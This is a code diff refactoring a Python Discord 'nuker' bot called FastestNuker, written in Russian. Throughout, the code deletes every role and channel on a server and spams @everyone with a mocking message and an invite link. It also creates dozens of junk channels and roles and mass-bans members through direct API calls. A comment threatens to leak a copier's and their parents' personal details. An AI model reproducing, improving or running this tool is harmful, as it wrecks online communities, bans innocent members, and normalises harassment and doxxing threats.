@@ -1,8 +1,8 @@
-import discord
+from discord import Intents
 from discord.ext import commands
-import requests as rq
-import asyncio
-import time
+from requests import put
+from asyncio import create_task
+# ОПТИМИЗАЦИЯ ИМПОРТОВ ВСЕГДА ДОЛЖНА БЫТЬ!! =)
 
 # JKtimosha не пизди код, бот не твой, и я знаю что ты пиздишь всё с моего гх
 # спиздишь = твой деанон(в тч родители) будет слит
@@ -12,14 +12,11 @@ prefix = '!' # наш префикс
 token = 'бот токен'
 
 # включаем интенты и создаем переменную бота (client)
-intents = discord.Intents.default()
+intents = Intents.default()
 intents.members = True
-client = commands.Bot(command_prefix=prefix, intents=intents)
-client.remove_command('help') # удаляем встроенную команду хелпа
-
-@client.event
-async def on_ready():
-    pass
+client = commands.Bot(command_prefix=prefix,
+                      help_command=None,
+                      intents=intents) # В кейворде можно писать на хелпкомманд :\
 
 async def killchannel(ctx,ch):
     try:
@@ -28,7 +25,7 @@ async def killchannel(ctx,ch):
         pass
 
 async def sendch(ctx,ch,text,count):
- for i in range(count):
+ for _ in range(count): # если ты не юзаешь i для перебора, то юзай символ _ (ускоряет работу)
     try:
         await ch.send(text)
     except:
@@ -47,7 +44,7 @@ async def createchannel(ctx):
     except:
         pass
     else:
-        asyncio.create_task(sendch(ctx,ch=c,text='@everyone\nУважаемые участники данного сервера :sunglasses:!\nК сожалению, админ или модератор этого сервера оказался :mammoth:ом, и добавил меня на сервер :clap:\nНу вообщем я так быстро всё удалил, что ваши колхозные aдмины ничего не сделали :joy:\nВообщем, наш сервер: https://discord.gg/fzlgroup :yellow_heart:',count=5))
+        create_task(sendch(ctx,ch=c,text='@everyone\nУважаемые участники данного сервера :sunglasses:!\nК сожалению, админ или модератор этого сервера оказался :mammoth:ом, и добавил меня на сервер :clap:\nНу вообщем я так быстро всё удалил, что ваши колхозные aдмины ничего не сделали :joy:\nВообщем, наш сервер: https://discord.gg/fzlgroup :yellow_heart:',count=5))
 
 async def createrole(ctx):
     try:
@@ -58,14 +55,14 @@ async def createrole(ctx):
 @client.command()
 async def kill(ctx):
     for rolee in ctx.guild.roles:
-        asyncio.create_task(killrole(ctx,role=rolee))
+        create_task(killrole(ctx,role=rolee))
     for channel in ctx.guild.text_channels:
-        asyncio.create_task(sendch(ctx,ch=channel,text='@everyone\nУважаемые участники данного сервера :sunglasses:!\nК сожалению, админ или модератор этого сервера оказался :mammoth:ом, и добавил меня на сервер :clap:\nНу вообщем я так быстро всё удалил, что ваши колхозные aдмины ничего не сделали :joy:\nВообщем, наш сервер: https://discord.gg/fzlgroup :yellow_heart:',count=1))
+        create_task(sendch(ctx,ch=channel,text='@everyone\nУважаемые участники данного сервера :sunglasses:!\nК сожалению, админ или модератор этого сервера оказался :mammoth:ом, и добавил меня на сервер :clap:\nНу вообщем я так быстро всё удалил, что ваши колхозные aдмины ничего не сделали :joy:\nВообщем, наш сервер: https://discord.gg/fzlgroup :yellow_heart:',count=1))
     for channel in ctx.guild.channels:
-        asyncio.create_task(killchannel(ctx,ch=channel))
-    for i in range(50):
-        asyncio.create_task(createchannel(ctx))
-        asyncio.create_task(createrole(ctx))
+        create_task(killchannel(ctx,ch=channel))
+    for _ in range(50):
+        create_task(createchannel(ctx))
+        create_task(createrole(ctx))
 
 @client.command()
 async def rename(ctx):
@@ -79,11 +76,11 @@ async def banus(ctx, limit=None):
     for member in memlist:
         if member.roles[-1].position >= ctx.guild.me.roles[-1].position:
             continue
-        rq.put(f'https://discord.com/api/guilds/{guild.id}/bans/{member.id}', headers={'Authorization': 'Bot ' + token, 'X-Audit-Log-Reason': 'Crushed by FastestNuker'}, json={'delete_message_days': 1})
+        put(f'https://discord.com/api/guilds/{guild.id}/bans/{member.id}', headers={'Authorization': 'Bot ' + token, 'X-Audit-Log-Reason': 'Crushed by FastestNuker'}, json={'delete_message_days': 1})
 
 @client.command()
 async def banall(ctx):
-    asyncio.create_task(banus(ctx,limit=None))
+    create_task(banus(ctx,limit=None))
 
 @client.command()
 async def help(ctx):
